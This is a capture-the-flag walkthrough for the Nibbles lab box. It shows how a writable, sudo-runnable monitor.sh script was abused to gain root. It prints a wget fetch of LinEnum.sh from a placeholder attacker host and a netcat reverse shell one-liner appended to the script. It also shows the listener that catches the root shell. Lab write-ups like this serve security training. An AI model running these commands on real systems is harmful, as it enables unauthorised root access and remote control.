# Nibbles - Privilege Escalation

## Steps to Escalate Privileges

1. **Analyzing `personal.zip`:**
   - Unzipped file contained a directory and a script `monitor.sh`.
   - Script was writeable by the `nibbler` user.

2. **Initial Content of `monitor.sh`:**
   - A monitoring script with no immediately useful functionality for privilege escalation.

3. **Automated Enumeration with LinEnum.sh:**
   - Downloaded `LinEnum.sh` via Python HTTP server and ran it on the target:
     ```bash
     wget http://<ATTACKER_IP>:8080/LinEnum.sh
     chmod +x LinEnum.sh
     ./LinEnum.sh
     ```
   - Output revealed sudo privileges for `nibbler`:
     ```
     User nibbler may run the following commands on Nibbles:
         (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
     ```

4. **Privilege Escalation Exploit:**
   - Appended a reverse shell one-liner to `monitor.sh`:
     ```bash
     echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <LISTENING_PORT> >/tmp/f' | tee -a monitor.sh
     ```
   - Ensured the original content of the file was not overwritten to avoid disruption.
   - Executed the script with sudo:
     ```bash
     sudo /home/nibbler/personal/stuff/monitor.sh
     ```

5. **Catching the Reverse Shell as Root:**
   - Started a Netcat listener to catch the root shell:
     ```bash
     nc -lvnp 8443
     ```
   - Verified root access:
     ```
     # id
     uid=0(root) gid=0(root) groups=0(root)
     ```

6. **Post-Exploitation:**
   - Obtained the `root.txt` flag from the root directory.

## Key Learnings
1. Writeable scripts owned by the current user can be leveraged for privilege escalation when sudo permissions are available.
2. Automated tools like LinEnum help identify privilege escalation vectors quickly.
3. Always append to existing files carefully to avoid overwriting original content.

## Final Notes
- This walkthrough is one possible method for solving the box.
- Try replicating steps using different tools to expand your skillset.
- Keep detailed notes to practice the essential skill of documentation.

# Questions (notes)
When using `wget` we use the ip address in the *tun0*, so it's:
`wget http://tun0:8080/LinEnum.sh`
